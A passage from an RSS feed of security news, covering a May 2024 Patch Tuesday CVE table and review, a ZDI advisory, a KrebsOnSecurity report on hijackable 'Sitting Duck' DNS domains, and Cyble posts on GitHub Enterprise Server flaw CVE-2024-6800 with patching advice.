  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30023"><span><span> </span>CVE-2024-30023<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30024"><span><span> </span>CVE-2024-30024<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30029"><span><span> </span>CVE-2024-30029<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30033"><span><span> </span>CVE-2024-30033<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Search Service Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30049"><span><span> </span>CVE-2024-30049<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Win32 Kernel Subsystem Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30059"><span><span> </span>CVE-2024-30059</span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Intune for Android Mobile
  Application Management Tampering Vulnerability</td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.1</td>
  <td class="xl69"><span> </span>No</td>
  <td class="xl69"><span> </span>No</td>
  <td class="xl69">Tampering</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30050"><span><span> </span>CVE-2024-30050<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mark of the Web Security Feature
  Bypass Vulnerability<span> </span></td>
  <td class="xl73"><span> </span>Moderate<span> </span></td>
  <td class="xl69">5.4</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">SFB</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-4331"><span><span> </span>CVE-2024-4331 *</span></a></td>
  <td class="xl68" width="263"><span> </span>Chromium: CVE-2024-4331 Use after free in
  Picture In Picture<span> </span></td>
  <td class="xl71"><span> </span>High</td>
  <td class="xl69">N/A</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-4368"><span><span> </span>CVE-2024-4368 *</span></a></td>
  <td class="xl68" width="263"><span> </span>Chromium: CVE-2024-4368 Use after free in
  Dawn<span> </span></td>
  <td class="xl71"><span> </span>High</td>
  <td class="xl69">N/A</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 
 <tr height="0">
  <td width="151"></td>
  <td width="263"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="95"></td>
 </tr>
 
</table>













  <p class=""><em>* Indicates this CVE had been released by a third party and is now being included in Microsoft releases</em>.</p><p class=""><em>† Indicates further administrative actions are required to fully address the vulnerability.</em></p><p class="">&nbsp;</p><p class="">There’s just one Critical-rated bug this month, and it deals with a remote code execution (RCE) vulnerability in SharePoint server. An authenticated attacker could use this bug to execute arbitrary code in the context of the SharePoint Server. While permissions are needed for this to occur, any authorized user on the server has the needed level of permissions.</p><p class="">Looking at the other RCE bugs, we see a lot of vulnerabilities in rarely used protocols. The Windows Mobile Broadband driver and the Routing and Remote Access Service (RRAS) make up the bulk of this category. More notable are the two bugs in Hyper-V. One of these would allow an authenticated attacker to execute code on the host system. This would result in a guest-to-host escape, but Microsoft doesn’t indicate what level the code execution occurs on the host OS. After a couple of months with many SQL-related fixes, there’s just one this month. As with the previous bugs, you would need to connect to a malicious SQL server. The bug in Cryptographic Services requires a machine-in-the-middle (MITM) but could lead to a malicious certificate being imported onto the target system. The RCE bugs are rounded out with open-and-own style bugs in Excel and .NET and Visual Studio.</p><p class="">Moving on to the elevation of privilege (EoP) patches in this month’s release, almost all lead to SYSTEM-level code execution if an authenticated user runs specially crafted code. While there isn’t a lot else to say about these bugs, they are often used by attackers to take over a system when combined with a code execution bug – like the Excel bug mentioned above. They convince a user to open a specially crafted Excel document that executes the EoP and takes over the system. The lone exception to this is the bug in the Brokering File System component. The vulnerability allows attackers to gain the ability to authenticate against a remote host using the current user’s credentials. The attack could be launched from a low-privileged AppContainer, which would allow the attacker to execute code or access resources at a higher integrity level than that of the AppContainer execution environment.</p><p class="">We’ve already discussed the MotW security feature bypass (SFB), and the only other SFB vulnerability receiving a fix this month is the MSHTML engine. Just when you thought you were safe from Internet Explorer, the Trident engine rears its ugly head. This bug allows an unauthenticated attacker to get code execution if they can convince a user to open a malicious document. The code execution occurs in the context of the user, so this is another reminder not to log on with Admin privileges unless you absolutely need to.</p><p class="">There are only seven information disclosure bugs receiving fixes this month, and we’ve already covered the one in SharePoint. As usual, most of these vulnerabilities only result in info leaks consisting of unspecified memory contents. The bug in Power BI could result in the disclosing of “sensitive information,” but Microsoft doesn’t narrow down what type of “sensitive information” could be leaked. Similarly, the bug in Deployment Services could leak “file contents.” Microsoft provides no information on whether that’s any arbitrary file contents or only specific files, so your guess is as good as mine.</p><p class="">The May release includes four spoofing bugs. The first is a stored cross-site scripting (XSS) bug in Azure Migrate. There’s not a straightforward patch for this one. You need the latest Azure Migrate Agent and ConfigManager updates. More info on how to do that can be found <a href="https://learn.microsoft.com/en-us/azure/migrate/common-questions-appliance#how-to-troubleshoot-auto-update-failures-for-azure-migrate-appliance.">here</a>. There are two spoofing bugs in Dynamics 365, but they read more like XSS bugs. The final spoofing bug addressed this month is in the Bing search engine. An attacker could modify the content of the vulnerable link to redirect the victim to a malicious site.</p><p class="">There’s a single Tampering bug addressed in this release fixing a bug in Microsoft Intune Mobile Application Management. An attacker could gain sensitive information on a target device that has been rooted.</p><p class="">The final bugs for May are Denial-of-Service (DoS) vulnerabilities in ASP.NET, DHCP server, and Hyper-V. Unfortunately, Microsoft provides no additional information about these bugs and how they would manifest on affected systems.</p><p class="">There are no new advisories in this month’s release.</p><p class=""><strong>Looking Ahead</strong></p><p class="">The next Patch Tuesday of 2024 will be on June 11, and I’ll return with details and patch analysis then. Until then, stay safe, happy patching, and may all your reboots be smooth and clean!</p>
]]></content:encoded>
<pubDate>Tue, 14 May 2024 17:28:20 +0000</pubDate>
</item>
<item>
<title>ZDI-24-1097: (0Day) Microsoft GitHub Dev-Containers Improper Privilege Management Privilege Escalation Vulnerability</title>
<link>http://www.zerodayinitiative.com/advisories/ZDI-24-1097/</link>
<guid>http://www.zerodayinitiative.com/advisories/ZDI-24-1097/</guid>
<content:encoded><![CDATA[
This vulnerability allows remote attackers to escalate privileges on Microsoft GitHub. Authentication is required to exploit this vulnerability. The ZDI has assigned a CVSS rating of 9.9.
]]></content:encoded>
<pubDate>Tue, 06 Aug 2024 00:00:00 -0500</pubDate>
</item>
<item>
<title>Don’t Let Your Domain Name Become a “Sitting Duck”</title>
<link>https://krebsonsecurity.com/2024/07/dont-let-your-domain-name-become-a-sitting-duck/</link>
<guid>https://krebsonsecurity.com/2024/07/dont-let-your-domain-name-become-a-sitting-duck/</guid>
<content:encoded><![CDATA[
<p>More than a million domain names &#8212; including many registered by Fortune 100 firms and brand protection companies &#8212; are vulnerable to takeover by cybercriminals thanks to authentication weaknesses at a number of large web hosting providers and domain registrars, new research finds.</p>
<div class="wp-caption aligncenter" id="attachment_68225" style="width: 760px;"><img alt="" class=" wp-image-68225" height="433" src="https://krebsonsecurity.com/wp-content/uploads/2024/07/duckstarget.png" width="750" /><p class="wp-caption-text" id="caption-attachment-68225">Image: Shutterstock.</p></div>
<p>Your Web browser knows how to find a site like example.com thanks to the global <a href="https://en.wikipedia.org/wiki/Domain_Name_System" rel="noopener" target="_blank">Domain Name System</a> (DNS), which serves as a kind of phone book for the Internet by translating human-friendly website names (example.com) into numeric Internet addresses.</p>
<p>When someone registers a domain name, the registrar will typically provide two sets of DNS records that the customer then needs to assign to their domain. Those records are crucial because they allow Web browsers to find the Internet address of the hosting provider that is serving that domain.</p>
<p>But potential problems can arise when a domain&#8217;s DNS records are &#8220;lame,&#8221; meaning the authoritative name server does not have enough information about the domain and can&#8217;t resolve queries to find it. A domain can become lame in a variety of ways, such as when it is not assigned an Internet address, or because the name servers in the domain&#8217;s authoritative record are misconfigured or missing.</p>
<p>The reason lame domains are problematic is that a number of Web hosting and DNS providers allow users to claim control over a domain <em>without accessing the true owner&#8217;s account at their DNS provider or registrar</em>.</p>
<p>If this threat sounds familiar, that&#8217;s because it is hardly new. Back in 2019, KrebsOnSecurity wrote about thieves employing this method to seize control over thousands of domains registered at GoDaddy, and using those <a href="https://krebsonsecurity.com/2019/01/bomb-threat-sextortion-spammers-abused-weakness-at-godaddy-com/" rel="noopener" target="_blank">to send bomb threats and sextortion emails</a> (GoDaddy says they fixed that weakness in their systems not long after that 2019 story).</p>
<p>In the 2019 campaign, the spammers created accounts on GoDaddy and were able to take over vulnerable domains simply by registering a free account at GoDaddy and being assigned the same DNS servers as the hijacked domain.</p>
<p>Three years before that, the same pervasive weakness was described in a blog post by security researcher <strong>Matthew Bryant</strong>, who showed how one could <a href="https://thehackerblog.com/the-orphaned-internet-taking-over-120k-domains-via-a-dns-vulnerability-in-aws-google-cloud-rackspace-and-digital-ocean/" rel="noopener" target="_blank">commandeer at least 120,000 domains</a> via DNS weaknesses at some of the world&#8217;s largest hosting providers.</p>
<p>Incredibly, new research jointly released today by security experts at <strong>Infoblox</strong> and <strong>Eclypsium</strong> finds this same authentication weakness is still present at a number of large hosting and DNS providers.</p>
<p>&#8220;It&#8217;s easy to exploit, very hard to detect, and it&#8217;s entirely preventable,&#8221; said <strong>Dave Mitchell</strong>, principal threat researcher at Infoblox. &#8220;Free services make it easier [to exploit] at scale. And the bulk of these are at a handful of DNS providers.&#8221;</p>
<h2>SITTING DUCKS</h2>
<p><a href="https://blogs.infoblox.com/threat-intelligence/who-knew-domain-hijacking-is-so-easy/" rel="noopener" target="_blank">Infoblox&#8217;s report</a> found there are multiple cybercriminal groups abusing these stolen domains as a globally dispersed &#8220;traffic distribution system,&#8221; which can be used to mask the true source or destination of web traffic and to funnel Web users to malicious or phishous websites.</p>
<p>Commandeering domains this way also can allow thieves to impersonate trusted brands and abuse their positive or at least neutral reputation when sending email from those domains, as we saw in 2019 with the GoDaddy attacks.</p>
<p>&#8220;Hijacked domains have been used directly in phishing attacks and scams, as well as large spam systems,&#8221; reads the Infoblox report, which refers to lame domains as &#8220;<strong>Sitting Ducks</strong>.&#8221; &#8220;There is evidence that some domains were used for Cobalt Strike and other malware command and control (C2). Other attacks have used hijacked domains in targeted phishing attacks by creating lookalike subdomains. A few actors have stockpiled hijacked domains for an unknown purpose.&#8221;</p>
<p>Eclypsium researchers <a href="https://eclypsium.com/blog/ducks-now-sitting-dns-internet-infrastructure-insecurity/" rel="noopener" target="_blank">estimate</a> there are currently about one million Sitting Duck domains, and that at least 30,000 of them have been hijacked for malicious use since 2019.</p>
<p>&#8220;As of the time of writing, numerous DNS providers enable this through weak or nonexistent verification of domain ownership for a given account,&#8221; Eclypsium wrote.</p>
<p>The security firms said they found a number of compromised Sitting Duck domains were originally registered by brand protection companies that specialize in defensive domain registrations (reserving look-alike domains for top brands before those names can be grabbed by scammers) and combating trademark infringement.</p>
<p>For example, Infoblox found cybercriminal groups using a Sitting Duck domain called <strong>clickermediacorp[.]com</strong>, which was a CBS Interactive Inc. domain initially registered in 2009 at GoDaddy. However, in 2010 the DNS was updated to DNSMadeEasy.com servers, and in 2012 the domain was transferred to <strong>MarkMonitor</strong>.</p>
<p>Another hijacked Sitting Duck domain &#8212; <strong>anti-phishing[.]org</strong> &#8212; was registered in 2003 by the <strong>Anti-Phishing Working Group</strong> (APWG), a cybersecurity not-for-profit organization that closely tracks phishing attacks.</p>
<p>In many cases, the researchers discovered Sitting Duck domains that appear to have been configured to auto-renew at the registrar, but the authoritative DNS or hosting services were not renewed.</p>
<p>The researchers say Sitting Duck domains all possess three attributes that makes them vulnerable to takeover:</p>
<p>1) the domain uses or delegates authoritative DNS services to a different provider than the domain registrar;<br />
2) the authoritative name server(s) for the domain does not have information about the Internet address the domain should point to;<br />
3) the authoritative DNS provider is &#8220;exploitable,&#8221; i.e. an attacker can claim the domain at the provider and set up DNS records without access to the valid domain owner&#8217;s account at the domain registrar.</p>
<div class="wp-caption aligncenter" id="attachment_68226" style="width: 761px;"><img alt="" class=" wp-image-68226" height="337" src="https://krebsonsecurity.com/wp-content/uploads/2024/07/sittingduckattack.png" width="751" /><p class="wp-caption-text" id="caption-attachment-68226">Image: Infoblox.</p></div>
<p>How does one know whether a DNS provider is exploitable? There is a frequently updated list published on <strong>GitHub</strong> called &#8220;<a href="https://github.com/indianajson/can-i-take-over-dns?tab=readme-ov-file" rel="noopener" target="_blank">Can I take over DNS</a>,&#8221; which has been documenting exploitability by DNS provider over the past several years. The list includes examples for each of the named DNS providers.<span id="more-68214"></span></p>
<p>In the case of the aforementioned Sitting Duck domain clickermediacorp[.]com, the domain appears to have been hijacked by scammers by claiming it at the web hosting firm <strong>DNSMadeEasy</strong>, which is owned by <strong>Digicert</strong>, one of the industry&#8217;s largest issuers of digital certificates (SSL/TLS certificates).</p>
<p>In an interview with KrebsOnSecurity, DNSMadeEasy founder and senior vice president <strong>Steve Job</strong> said the problem isn&#8217;t really his company&#8217;s to solve, noting that DNS providers who are also not domain registrars have no real way of validating whether a given customer legitimately owns the domain being claimed.</p>
<p>&#8220;We do shut down abusive accounts when we find them,&#8221; Job said. &#8220;But it&#8217;s my belief that the onus needs to be on the [domain registrants] themselves. If you&#8217;re going to buy something and point it somewhere you have no control over, we can&#8217;t prevent that.&#8221;</p>
<p>Infoblox, Eclypsium, and the DNS wiki listing at Github all say that web hosting giant <strong>Digital Ocean</strong> is among the vulnerable hosting firms. In response to questions, Digital Ocean said it was exploring options for mitigating such activity.</p>
<p>&#8220;The DigitalOcean DNS service is not authoritative, and we are not a domain registrar,&#8221; Digital Ocean wrote in an emailed response. &#8220;Where a domain owner has delegated authority to our DNS infrastructure with their registrar, and they have allowed their ownership of that DNS record in our infrastructure to lapse, that becomes a &#8216;lame delegation&#8217; under this hijack model. We believe the root cause, ultimately, is poor management of domain name configuration by the owner, akin to leaving your keys in your unlocked car, but we acknowledge the opportunity to adjust our non-authoritative DNS service guardrails in an effort to help minimize the impact of a lapse in hygiene at the authoritative DNS level. We’re connected with the research teams to explore additional mitigation options.&#8221;</p>
<p>In a statement provided to KrebsOnSecurity, the hosting provider and registrar <strong>Hostinger</strong> said they were working to implement a solution to prevent lame duck attacks in the &#8220;upcoming weeks.&#8221;</p>
<p>&#8220;We are working on implementing an SOA-based domain verification system,&#8221; Hostinger wrote. &#8220;Custom nameservers with a Start of Authority (SOA) record will be used to verify whether the domain truly belongs to the customer. We aim to launch this user-friendly solution by the end of August. The final step is to deprecate preview domains, a functionality sometimes used by customers with malicious intents. Preview domains will be deprecated by the end of September. Legitimate users will be able to use randomly generated temporary subdomains instead.&#8221;</p>
<p>What did DNS providers that have struggled with this issue in the past do to address these authentication challenges? The security firms said that to claim a domain name, the best practice providers gave the account holder random name servers that required a change at the registrar before the domains could go live. They also found the best practice providers used various mechanisms to ensure that the newly assigned name server hosts did not match previous name server assignments.</p>
<p>[Side note: Infoblox observed that many of the hijacked domains were being hosted at <strong>Stark Industries Solutions</strong>, a sprawling hosting provider that appeared two weeks before Russia invaded Ukraine and has become <a href="https://krebsonsecurity.com/2024/05/stark-industries-solutions-an-iron-hammer-in-the-cloud/" rel="noopener" target="_blank">the epicenter of countless cyberattacks against enemies of Russia</a>].</p>
<p>Both Infoblox and Eclypsium said that without more cooperation and less finger-pointing by all stakeholders in the global DNS, attacks on sitting duck domains will continue to rise, with domain registrants and regular Internet users caught in the middle.</p>
<p>&#8220;Government organizations, regulators, and standards bodies should consider long-term solutions to vulnerabilities in the DNS management attack surface,&#8221; the Infoblox report concludes.</p>
]]></content:encoded>
<pubDate>Wed, 31 Jul 2024 12:06:45 +0000</pubDate>
</item>
<item>
<title>The SAML Exploit That Could Take Down GitHub: What You Need to Know About CVE-2024-6800</title>
<link>https://cyble.com/blog/saml-exploit-github-cve-2024-6800/</link>
<guid>https://cyble.com/blog/saml-exploit-github-cve-2024-6800/</guid>
<content:encoded><![CDATA[
<p><img alt="Take Down GitHub" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/08/Blog-Image01.webp" tabindex="0" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key Takeaways&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>CVE-2024-6800 is a severe security flaw discovered in GitHub Enterprise Server (GHES), which could allow unauthorized access and control over sensitive systems by exploiting XML signature wrapping and forged SAML responses.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The vulnerability impacts all GHES versions prior to 3.14, excluding versions 3.13.3, 3.12.8, 3.11.14, and 3.10.16, indicating that many installations could be at risk.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Exploiting this vulnerability can grant attackers unauthorized access to GHES instances, enabling them to view, modify, or delete critical source code and sensitive data and potentially compromising entire supply chains.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>GHES instances are often accessible over the internet, which broadens the <a href="https://cyble.com/solutions/attack-surface-management/">attack surface</a> and increases the likelihood of exploitation, emphasizing the need for immediate action. </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>GitHub has released critical security updates to address CVE-2024-6800. Organizations are strongly advised to upgrade to the latest GHES version to apply essential patches and secure their systems.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>GHES version 3.13.3 includes fixes for CVE-2024-6800 and additional security improvements, addressing both critical and medium-severity vulnerabilities and enhancing overall system security.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The update also introduces new features like improved diagnostic tools and configuration management enhancements, which help in better managing and troubleshooting GHES instances.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble Research &amp; Intelligence Labs' (CRIL) <a href="https://cyble.com/blog/weekly-it-vulnerability-report-august-2024/">Weekly Vulnerability Intelligence Report </a>has recently revealed critical flaws with the potential to impact major technology platforms. Among the most concerning is a security issue affecting GitHub Enterprise Server (GHES). The vulnerability, identified as CVE-2024-6800, poses risks to organizations using GHES, potentially allowing unauthorized access and control over sensitive systems. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>On August 22, 2024, the Cyber Security Agency of Singapore (SingCERT) released an alert about <a href="https://www.csa.gov.sg/alerts-advisories/alerts/2024/al-2024-108" rel="noreferrer noopener nofollow" target="_blank">CVE-2024-6800</a>, a critical vulnerability in the GitHub Enterprise Server (GHES). GHES is a self-hosted version of GitHub, tailored for organizations that require a secure and customizable platform for managing source code and facilitating collaboration among development teams. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CVE-2024-6800 is an XML signature wrapping vulnerability that affects GHES. This flaw allows unauthenticated attackers to exploit Security Assertion Markup Language (SAML) responses to gain unauthorized access. By forging a SAML response, an attacker could provision and access user accounts with site administrator privileges.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Decoding the GitHub Enterprise Server Vulnerability&nbsp;&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>The CVE-2024-6800 vulnerability affects all GitHub Enterprise Server (GHES) versions prior to 3.14, except versions 3.13.3, 3.12.8, 3.11.14, and 3.10.16. This broad range of affected versions means that a significant number of GHES installations are at risk.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The impact of CVE-2024-6800 is substantial, particularly because GHES is crucial for managing the source code of critical applications. Exploiting this vulnerability could lead to unauthorized access, allowing attackers to bypass authentication and gain unrestricted access to GHES instances.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This access could enable them to view, alter, or delete sensitive source code and other important data. Additionally, with administrator privileges, attackers could manipulate code or configurations, potentially compromising the entire supply chain and leading to broader security breaches affecting downstream systems and users.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The vulnerability’s exposure is exacerbated by the fact that GHES instances are often accessible over the internet. This broad attack surface heightens the risk of exploitation, highlighting the need for organizations to mitigate the threat quickly.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Mitigation and Recommendations&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>To address the critical vulnerability CVE-2024-6800, GitHub has issued <a href="https://docs.github.com/en/enterprise-server@3.13/admin/release-notes#3.13.3" rel="noreferrer noopener nofollow" target="_blank">essential security updates</a> for GitHub Enterprise Server (GHES). Organizations using GHES are strongly encouraged to implement immediate measures to mitigate the risks associated with this vulnerability. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Administrators should promptly upgrade to the latest GHES version, which includes crucial patches designed to fix the XML signature wrapping issue. This will secure GHES instances against potential <a href="https://cyble.com/knowledge-hub/what-is-a-cyber-attack/">cyber attacks</a>. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Organizations should also review their security policies and actively monitor their systems for any suspicious activity that might indicate attempts to exploit the vulnerability. Ensuring that access controls are properly configured and regularly reviewed will help in preventing unauthorized access.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Moreover, the security update addressing CVE-2024-6800 is included in GHES version 3.13.3. This release not only tackles the critical vulnerability but also introduces several improvements and fixes. Key security enhancements in this update include a specific fix for CVE-2024-6800, which resolves the XML signature wrapping vulnerability by blocking unauthorized access through forged SAML responses. Additionally, the update addresses several medium-severity vulnerabilities affecting both public and private repositories, contributing to improved overall security.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>GHES version 3.13.3 also brings new features and enhancements. It includes improved diagnostic tools that allow users to view app states for gists, networks, and wikis, and the spokesctl check command now diagnoses and resolves issues with empty repository networks. Configuration tools have been enhanced for better management and diagnostics, including improvements to the ghe-config-apply process and more effective handling of configuration logs.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The update resolves various bugs affecting system stability and user experience. It addresses issues related to configuration runs, unnecessary connections, and failures in Dependency Graph updates. It also contains user experience improvements, including fixes for problems with GitHub Actions, backup and restoration processes, and instance management.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Conclusion&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>CVE-2024-6800 represents a challenge to organizations using GitHub Enterprise Server. The XML signature wrapping flaw poses serious risks, including unauthorized access and compromised systems. Organizations should upgrade to GHES version 3.13.3 to address this <a href="https://cyble.com/solutions/vulnerability-management/">vulnerability</a> and take advantage of the latest security improvements.  </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Regular updates and proactive monitoring are vital for protecting development environments from potential threats. For further details on the update and to access the latest security patches, organizations should refer to GitHub's official documentation and follow the recommended actions.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p>The post <a href="https://cyble.com/blog/saml-exploit-github-cve-2024-6800/" rel="nofollow">The SAML Exploit That Could Take Down GitHub: What You Need to Know About CVE-2024-6800 </a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Mon, 26 Aug 2024 10:18:36 +0000</pubDate>
</item>
<item>
<title>Weekly IT Vulnerability Report for August 20, 2024: Urgent Fixes Recommended for GitHub, PHP, Windows, and SAP</title>
<link>https://cyble.com/blog/weekly-it-vulnerability-report-august-2024/</link>
<guid>https://cyble.com/blog/weekly-it-vulnerability-report-august-2024/</guid>
<content:encoded><![CDATA[
<p><img alt="Weekly IT Vulnerability Report" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/08/Blog-Image1.webp" tabindex="0" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key Takeaways&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list {"ordered":true,"start":1} --></p>
<ol class="wp-block-list" start="1"><!-- wp:list-item --></p>
<li>CVE-2024-6800 (GitHub Enterprise Server) poses the risk of data breaches and supply chain attacks. </li>
<p><!-- /wp:list-item --></ol>
<p><!-- /wp:list --></p>
<p><!-- wp:list {"ordered":true,"start":2} --></p>
<ol class="wp-block-list" start="2"><!-- wp:list-item --></p>
<li>CVE-2024-38063, a critical Remote Code Execution (RCE) vulnerability in Windows, may enable <a href="https://cyble.com/knowledge-hub/what-is-a-cyber-attack/">cyber attacks</a> on a mass scale, affecting both government and private entities. </li>
<p><!-- /wp:list-item --></ol>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://cyble.com/blog/">Cyble Research and Intelligence Labs </a>(CRIL) researchers investigated 12 vulnerabilities from August 14 to August 20, ranging in severity from medium to critical. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CRIL researchers also observed five instances of vulnerabilities and Proof of Concept (POC) exploits discussed on underground channels and cybercrime forums during that period.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Based on Cyble’s assessments of the relative cyber threats presented by the vulnerabilities and exploits, five vulnerabilities stand out as warranting priority attention by security teams. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">The Week’s Top Vulnerabilities&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Here is a deeper analysis of those five vulnerabilities identified by Cyble researchers.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">1. CVE-2024-6800: XML Signature Wrapping Vulnerability in GitHub Enterprise Server&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
